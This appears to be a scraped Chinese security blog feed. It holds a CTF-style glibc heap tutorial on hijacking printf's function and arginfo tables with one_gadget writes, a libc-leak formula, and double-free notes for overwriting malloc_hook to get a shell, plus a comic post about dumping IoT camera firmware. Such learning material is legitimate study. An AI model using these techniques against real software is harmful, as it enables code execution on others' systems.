__register_printf_specifier (spec, converter,</span><br><span class="line">      (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (__register_printf_function, register_printf_function)</span><br><span class="line">    </span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__register_printf_specifier)</span><br></pre></td></tr></table></figure><p>让我们看看源码做了那些事情</p><ol><li>首先，判断spec是否为char范围内，若不是，退出</li><li>接着判断 <code>__printf_function_table</code> 是否为空，若是空，就通过calloc分配堆内存存放__printf_arginfo_table以及__printf_function_table。两个表空间都为0x100，可以为0-0xff的每个字符注册一个函数指针，第一个表后面紧接着第二个表。</li></ol><p>在<code>vfprintf</code>函数中，如果检测到<code>__printf_function_table</code>不为空，则对于格式化字符不走默认的输出函数，而是调用<code>printf_positional</code>函数，进而可以调用到表中的函数指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c : 1412</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">            || __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">            || __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// vfprintf-internal.c : 1682</span></span><br><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">                done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">                save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure><p><code>__printf_function_table</code>中类型为<code>printf_function</code>的函数指针，在<code>printf-&gt;vfprintf-&gt;printf_positional</code>被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c : 1962</span></span><br><span class="line"><span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">          &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">          &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line">                 * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class="line">       ++i)</span><br><span class="line">        ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr); <span class="comment">// 调用__printf_function_table中的函数指针</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">         about # of chars.  */</span></span><br><span class="line">      <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">          done = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> all_done;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      done_add (function_done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个在<code>__printf_arginfo_table</code>中的类型为<code>printf_arginfo_size_function</code>的函数指针，在<code>printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb</code>中被调用，其功能是根据格式化字符做解析，返回值为格式化字符消耗的参数个数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c : 1763</span></span><br><span class="line">nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// printf-parsemb.c (__parse_one_specmb函数)</span></span><br><span class="line"><span class="comment">/* Get the format specification.  */</span></span><br><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">  || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">  || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span> <span class="comment">// 判断是否为空</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment"> uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment"> the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">  || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) <span class="comment">// 调用__printf_arginfo_table中的函数指针</span></span><br><span class="line">               (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">                &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Find the data argument types of a built-in spec.  */</span></span><br><span class="line">  spec-&gt;ndata_args = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>从源码中可以看到，我们先调用了<code>__printf_arginfo_table</code>中的函数指针，再调用了<code>__printf_function_table</code>中的函数指针。</p><ol><li><p>假设现在<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>分别被填上了<code>chunk 4</code>与<code>chunk 8</code>的堆块地址（<code>chunk header</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6c7e</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure></li><li><p>由于有堆块头，所以格式化字符的索引要减<code>2</code>，这样写就满足了<code>__printf_function_table</code>不为空，进入了<code>printf_positional</code>函数，并调用了<code>__printf_arginfo_table</code>中的函数指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6ed8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure></li></ol><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2>]]></content>
      
      
      
        <tags>
            
            <tag> glibcLearning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次提取固件的抽象经过</title>
      <link href="/2023/08/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E7%BB%8F%E8%BF%87/"/>
      <url>/2023/08/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E7%BB%8F%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次提取固件的抽象经过"><a href="#记一次提取固件的抽象经过" class="headerlink" title="记一次提取固件的抽象经过"></a>记一次提取固件的抽象经过</h1><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>大二开学，这不得整点新活。于是直接瞄上了iot，当然是因为 <del>赚钱</del> 。</p><p>于是，故事的开端从这里开始</p><p><img src="/../images/1693410257765.png" alt="1693410257765"></p><h2 id="0x2-当代大学生第一次闲鱼买东西"><a href="#0x2-当代大学生第一次闲鱼买东西" class="headerlink" title="0x2 当代大学生第一次闲鱼买东西"></a>0x2 当代大学生第一次闲鱼买东西</h2><p>这玩意儿提固件就扔了，秉着绝不浪费的原则，我直接下载了某海鲜市场。看某二刺猿好友天天在闲鱼卖东西，因为买家砍价很不高兴，我胆战心惊，生怕一个不小心就惹得人家不高兴，被别人挂在其他地方。但是这玩意儿你要我68？哥们这学期生活费一个月1k(别问，问就是我爸说我太胖了让我少吃点)</p><p>穷人的孩子早当家，我特地咨询了一下别人，生怕我的不小心让神明怪罪于我</p><p><img src="/../images/1693410554251.png" alt="1693410554251"></p><p>然后</p><p><img src="/../images/1693410602817.png" alt="1693410602817"></p><p>这句话很温柔，已经很久没有人对哥们这么温柔的说话了，哥们每天的生活主打的一个阴暗扭曲爬行，温柔的小姐姐头像配上温柔的话语，我不买都不太好意思，于是哥们从1k生活费里面掏出了68r，准备激情下单，然后</p><p><img src="/../images/1693411144301.png" alt="1693411144301"></p><p>她竟然还让我早点睡，她真的好温柔</p><p><strong>以上是一个被提固件搞崩溃的男人的发癫记录，下面才是重点</strong> </p><h2 id="0x3-小固件，这么烧，想不想被爸爸的大CH341A塞满啊"><a href="#0x3-小固件，这么烧，想不想被爸爸的大CH341A塞满啊" class="headerlink" title="0x3 小固件，这么烧，想不想被爸爸的大CH341A塞满啊"></a>0x3 小固件，这么烧，想不想被爸爸的大CH341A塞满啊</h2><p>8.30日，阴风阵阵，去拿快递前看见大家都在用dw的bot每日测rp，我也兴致勃勃的来了一次</p><p><img src="/../images/1693411386018.png" alt="1693411386018"></p><p>好像预示着今天是不平凡的一天，无妨，59在我的记录里已经很高了，总比114514强</p><p><img src="/../images/1693411468632.png" alt="1693411468632"></p><p>拿到快递，出去和舍友吃了个饭，爆了112金币，看起来是溧阳最贵的饭了(什么时候能去南京啊)，回到宿舍开始干活</p><p><strong>等等，别急，这玩意儿…好像要螺丝刀？</strong></p><p>好在，池佬给我提供了帮助，给了我一个全套的螺丝刀，但是意外又发生了</p><p><img src="/../images/931d0d3ba75fe23f05408630e84ffdfa_720.jpg" alt="img"></p><p>有人以为要从底座开始全拆了，找遍了池佬的螺丝刀没一个可以的</p><p>我就开始</p><p><img src="/../images/1693411685805.png" alt="1693411685805"></p><p><img src="/../images/1693411702340.png" alt="1693411702340"></p><p><img src="/../images/1693411730269.png" alt="1693411730269"></p><p>好在，最后和池佬另辟蹊径，只把摄像头干下来了，其他地方不拆了</p><p><strong>真正的苦难从现在开始</strong></p><p>好不容易接上了</p><p><img src="/../images/1693411823837.png" alt="1693411823837"></p><p>请忽略我的原神，虽然我也曾为他启动，但是现在我是无期迷途的人</p><p>上图的线好像接反了，好在好兄弟甩了我一本教程，终于接对了，然后</p><p><img src="/../images/1693411933057.png" alt="1693411933057"></p><p>啊…？</p><p>摆弄了半天夹子，终于还是响应了，开始美滋滋的选厂商</p><p>等等…？</p><p><img src="/../images/1693411982089.png" alt="1693411982089"></p><p><img src="/../images/1693411997757.png" alt="1693411997757"></p><p>这…？啊…？查不到啊…</p><p>没事，打CTF的谁不会爆破了啊，就三个，我一个来一遍不就好了</p><p><img src="/../images/71bd61e255ef7c9b66ca045b65f4df4c.png" alt="img"></p><p>啊…？你家程序全是\x00，真好，真方便我逆向</p><p>看起来蛮好的，最起码能检测出来芯片</p><p>突然，他就痿了，检测不出来了</p><p><img src="/../images/1693412231441.png" alt="1693412231441"></p><p>呵，小烧货</p><p><img src="/../images/1693412265952.png" alt="1693412265952"></p><p>池佬提醒我了，让我检测功能看看，毕竟出于对温柔的卖家姐姐的信任，我也没检测功能。果然，半天没反应，万籁俱寂，烧了，小烧货，让爸爸赔了60r，我正准备下单重新买的时候，妈的，这摄像头自己动了，我草，给我吓得一机灵</p><p><img src="/../images/1693412502919.png" alt="1693412502919"></p><p><img src="/../images/71f7103f48b5030d5d8a6fac0f655947_720.jpg" alt="img"></p><p>好好好，没坏，真好用，就是链接wifi的时候让我输入nuaa.wifi6的密码属实有点没绷住</p><p><img src="/../images/1693412572990.png" alt="1693412572990"></p><p>博客写到这里，nuaa突然断网了，怎么，小烧货，你也不想让别人知道你的故事吧</p><p><img src="/../images/1693412618793.png" alt="1693412618793"></p><p>今晚暂且休战，明天好好修理你，非得把你提取的一干二净</p>]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态分析</title>
      <link href="/2023/08/28/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/28/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="963186646f033f96da80bb9a6e7d7c6a47e78ce4cec989143dd57a84a85f6c8a">efea7189102a66c761a45889bcdf3deb2f67f99fd144c57abf0ebc141c3f41cd917df05e1a4672f215e5ae704be5ef2856b81ad4b4568b4f9031f75e5425c0c5f6477db0c1773a27c07d343474cde6e452bd9840acf7fb11fbe0ff034bd71903b8bd261139f3955109e98246aa0ac4ad9dcd87969ac276b2b8eb287bce6896f35bad8e8acad13d22761e6c1bfda66f822a988acf2f52eadddfe8f0c8fd38635406dad16e9fb3fe6bb58a579129e6ff254e0a2d339e644e2a502eab1770861e9f6bd900b93141d9b8121b2aad66c1b2f14a0a4b6be988b0cdb5fcc31bc4c70db4614f692c3941955b51bce0e08b8821d9fad4b30296c39dae70c331588cae96254723d7826a41e9a458f700562581754213c1c49a50c36f7003826afa50594bfafb00b24f9499c7acda7f50c5a92e7ed42491defc5e58e115bee25ed5a780b5b0ed55419dedee513daf5cd7864f301265ee78e3a1b2fe5da8c4a1118f58326f8d21571cdfc6514d33447ef9bbe0ffb2d2f0073ad2b98587628526028f6de78596e042330990c988efb2038ec692918d8a6ae4fecefb78b30034ee38be298703a5c15fa99557fe878b07029994698a462cf988376b1881cd7105abba1a5a5a06b39eafabcaa3aa8c376a39e6e43bea850a02396028f94bf673e094deaa5122ac2fc9d9026f393a6834e0cd8010de6458fbe05b62cb08576f68a531137a83f3dbacf3e0563efb613a7abfc3b6ad59c893983974943f3244886297dd4f117b72525e5025ac8e7e058be1b554cba9146d15e94f6788be783eb7e09d9a8280f97dba44790deb267cc3f4c698343f9825e04410f4102dee20742f9fe58aacd7e86b8aec013c48de8957111f462f5cb1284f805a846700294fb44056ab85207bba5e3a2a19842266aede51221fc00563b2863cb5f3bf96cec2ca7c10e20dc303fdc260f56dbb57d9c1f635160e54214e9917f08d82d95e295337294b28b58fcace9677ae92b567f026e935aa1fd113cac312536e0e96a4026d9be27598ace8bf10617778cda6c4f2620d2140d159df14fa314ff6360b8316b6b9d5ed73b02dc4e57bb54a13e5155bc3773b1501b3820a002b4ec9d46d1e8ccda23a67464bd7f5253981f64dce6c19964564534a6482e8c006b860bb2ef0b92504df18bfc06e3971201a94454318f0b16d7f5360349f7780d0d24ab794c6b492ca5d182770a9872c0b8456e51179d9ab3c25aeaab5729bcb9736fe6e47e49da2076bdd2833d3c875a22100781bee5c8a2c1f4eb10ff4a3731cccec4b944b4856fdf31222fdd1b07d736ea1b7020f901470f128b66ea05addaf038a1729bf009c005de8825eb99e43447850450c22fd7bc19e03ef282399192117571c68872731382ecbf9339fa85203c24708fbdba7f37d263f9f9c5e9888fe1177f6f72aeb4de2f5e980e4fe553068b1569e8f73497b7c3e531f6427d8abb63fba26523dcee1f4945a81792b0f2ad604f66160c2ee5bb74f3f3fbe63513e76cb2bf4817883efb5a75b084d565efe9be000746365299ab822dd55736fb535fe37c899a4e4c9fb333a323367186184343923131b6edf3c97ccb1d8cfe926b863cbdeced75be48f7758d4ae50f1f6f3eb064dd86f03fc5ce1921c570d46feec14fcf88bed8273fa835d0697ba0f95722c9567f1ffd0f287235fa6299a8be4a74a0eddcd21a457fe58ad11a3ef869b53baf0c2598ab7746be31fc86b0b4153641130c3ee0ea0a6e1c50fcc4748aa5061590aaefe6b7cb8d514327621bce58c293c2e51</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc_final</title>
      <link href="/2023/08/19/glibc-final/"/>
      <url>/2023/08/19/glibc-final/</url>
      
        <content type="html"><![CDATA[<h1 id="glibc总结"><a href="#glibc总结" class="headerlink" title="glibc总结"></a>glibc总结</h1><p>学了也有三个月的glibc（其实自己一直在摆烂），感觉glibc不是很有意思，今天写个总结，就把这东西跳过了吧（毕竟看现在各位大爹出的题都是VM，jit这种）</p><p>在此我会借鉴很多师傅的文章 <strong>（如果有侵权行为请联系 <a href="mailto:&#50;&#50;&#x39;&#53;&#x30;&#52;&#x30;&#51;&#x36;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#109;">&#50;&#50;&#x39;&#53;&#x30;&#52;&#x30;&#51;&#x36;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#109;</a> 删除）</strong> </p><h2 id="Heap的基础知识"><a href="#Heap的基础知识" class="headerlink" title="Heap的基础知识"></a>Heap的基础知识</h2><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><p><em>heap</em> 由低地址向高地址增长，与栈相反，在内存分配如下图</p><p><img src="/../images/0dc4f7566f290977a7a8af2482101e81-1692503147910.png" alt="img"></p><blockquote><p>在Linux系统上，程序被载入内存时，内核为用户进程地址空间建立了代码段、数据段和堆栈段，在数据段与堆栈段之间的空闲区域用于动态内存分配。内核数据结构mm_struct中的成员变量start_code和end_code是进程代码段的起始和终止地址，start_d</p><p>ata和 end_data是进程数据段的起始和终止地址，start_stack是进程堆栈段起始地址， <strong>start_brk</strong> 是进程动态内存分配起始地址（堆的起始地址），还有一个 brk（堆的当前最后地址），就是动态内存分配当前的终止地址。</p></blockquote><p>这里涉及到两个函数， <em>brk()</em> 和 <em>sbrk()</em> ，两者通过改变程序间断点( <em>program break</em> )来扩展堆区域的大小，若是不开启ASLR， <em>start_brk</em> 就位于bss后，若是开启ALSR，就会在bss后高地址处随机设置 <em>start_brk</em></p><ul><li><p>malloc类的函数通过 <em>sbrk()</em> 来进行分配</p></li><li><p>对于mmap: <em>mmap()</em> 函数将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的<br>大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。 <em>munmap()</em>  执行相反的操<br>作，删除特定地址区域的对象映射。函数的定义如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length)</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>首先介绍一下chunk的结构，这里拿 <em>ptmalloc源码分析</em> 这本书中的图做个例子</p><p><img src="/../images/1692452554531.png" alt="1692452554531"></p><p>可以发现，size位有三个标志位</p><blockquote><p>A:该chunk属于主分配区还是非主分配区域</p></blockquote><blockquote><p>M:该chunk是mmap获得还是非mmap获得</p></blockquote><blockquote><p>P:prev_chunk是否在使用中,只有p&#x3D;0时，prev_size才有效，否则可以被共用(如下)</p></blockquote><p><strong>注意：</strong>chunk的size存在内存对齐，分配时 <em>size&#x3D;size+0x10</em> 因为要加上chunk头，并且存在空间复用，例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样子获得的chunk1，chunk2的大小均为0x20。</p><h3 id="当chunk被释放后"><a href="#当chunk被释放后" class="headerlink" title="当chunk被释放后"></a>当chunk被释放后</h3><p><img src="/../images/1692453011611.png" alt="1692453011611"></p><p>可以看到，原本的chunk的data区域被覆盖，多了四个新东西 <em>FD，BK，FD_nextsize，BK_nextsize</em></p><p>其中fd指向链表中的下一个chunk，bk指向链表中上一个chunk。fd_nextsize和bk_nextsize比较特殊，只存在于largebin中，这是由于largebin比较独特的储存方式，我们稍后再讲</p><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><p><img src="/../images/1692503379324.png" alt="1692503379324"></p><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><ol><li>LIFO，例如链表中存在 <em>C-&gt;B-&gt;A</em> ，free(D)后，会出现 <em>D-&gt;C-&gt;B-&gt;A</em> 再次malloc时，也会优先取出D</li><li>由于fastbin是为了一些小的碎片化的chunk设立的，在chunk进入fastbin时，P并不变为1</li><li>fastbin链表的最小值为0x20，最大值为0x80(默认)，公差为0x10，在申请加入fastbin时，不会对 <em>prev_size</em> 进行检查，但是会对 <em>size</em> 的合法性进行检查</li><li>当申请一个堆块大于smallbin的最小大小时，会触发 <em>malloc_consolidate()</em> ，他会首先把fastbin中相邻的块 <em>(指物理地址相邻)</em> 进行合并，合并后放入unsortedbin中，随后，为了分配申请的chunk，会对unsortedbin进行遍历，然后将其归为到smallbin等链表中，使得fastbin清空</li><li>若是free后的chunk于相邻的chunk合并后的大小大于 <em>FASTBIN_CONSOLIDATION_THRESHOLD</em> (包括与 <em>topchunk</em> 的合并)，都会触发 <em>malloc_consolidate()</em> ,从而清空fastbin</li></ol><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol><li><p>双向链表，FIFO</p></li><li><p>chunk被放入smallbin，largebin之前，一定会被放到unsortedbin，之后通过整合分配再分配到各自的链表中</p></li><li><p>unsortedbin常用来泄露libc，当unsortedbin中只存在1个chunk的时候，FD和BK都会指向 <em>&lt;main_arena+88&gt;</em> 的地方，此时若可以进行show等操作，便可以把libc泄露出来，可以直接vmmap减去偏移即可。也可以利用规律，64位中， <em>malloc_hook</em> 与 <em>main_arena</em> 相差0x10，32位下该偏移为0x18</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">88</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><ol><li>双向链表，FIFO</li><li>size:0x20-0x3F0</li></ol><h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><ol><li><p>双链表，FIFO</p></li><li><p>largebin比较特殊，多出了 <em>fd_nextsize，bk_nextsize</em>,这两个指针导致largebin的存储存在横向和纵向链表，这是由于largebin不同于其他链表储存的方式，largebin每个链表中储存的是一定范围内的chunk<img src="/../images/1345812086_6124-1692514017441.png" alt="1345812086_6124"></p><p>上图中可以发现，在同一个bin中，通过 <em>fd_nextsize and bk_nextsize</em> 链接不同大小的chunk，相同大小的chunk通过 <em>fd &amp; bk</em> 进行链接</p></li></ol><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><ol><li><em>libc-2.27</em> 引入，LIFO，单向链表</li><li>每个bin存放的大小相同且最多7个，存在 <em>tcache_prethread_struct</em> 结构体，该结构体位于heap首块内存，大小为 <em>0x250</em> ，可以通过一定方式修改这个chunk中记录的tcache的数量来达到释放到unsortedbin中的效果</li><li>从 <em>fastbin&#x2F;smallbin</em> 中取出一个chunk，剩下的chunk会放到 <em>tcache</em> 中，直到达到 <em>tcache</em> 的上限，在从smallbin中移动到tcache中，除了第一个chunk的fd会被检查之外，其余的chunk都会缺失了 <em>__glibc_unlikely(bck-&gt;fd!&#x3D;victim)</em> 的双向链表完整性的检查</li></ol><h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><h3 id="Use-After-Free-UAF"><a href="#Use-After-Free-UAF" class="headerlink" title="Use_After_Free(UAF)"></a>Use_After_Free(UAF)</h3><p><em>uaf</em> 是比较常见的漏洞，触发点为free了chunk之后并没有指针进行置0，uaf可以导致show fd等内容，泄露重要内容以及doublefree等</p><h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double_free"></a>Double_free</h4><ol><li><strong>libc2.23下的double_free：</strong><ol><li><em>fastbin：</em> 对于fastbin来说，若是free的chunk雨FastbinY的首个chunk相同，就会报错，所以我们可以利用另外的一个chunk进行doublefree，例如首先构成 <em>B-&gt;A</em> 之后再次free(A)，就会形成 <em>A-&gt;B-&gt;A</em> 之后申请A，对A进行edit，就可以完成任意地址的分配，<strong>常常通过修改malloc_hook为one_gadget的方式来getshell</strong></li></ol></li><li><strong>libc2.27下的double_free：</strong> 